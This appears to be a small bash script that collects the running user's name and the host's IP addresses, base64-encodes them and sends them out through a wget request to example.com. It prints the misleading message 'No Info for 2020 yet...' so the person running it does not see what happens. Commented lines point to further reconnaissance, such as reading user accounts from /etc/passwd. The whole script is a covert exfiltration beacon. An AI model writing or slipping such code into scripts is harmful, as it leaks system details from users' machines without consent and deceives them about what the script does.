#!/bin/bash

INFO="$(whoami) $(hostname -I)"
#ifconfig
#hostname -I
#awk -F: '{ print $1}' /etc/passwd

echo "No Info for 2020 yet..."
#echo $INFO
#ENCODED=$(echo 'linuxhint.com' | base64)
ENCODED=$(echo $INFO | base64)
#echo $ENCODED
#echo $ENCODED | base64 --decode

wget example.com?i=$ENCODED
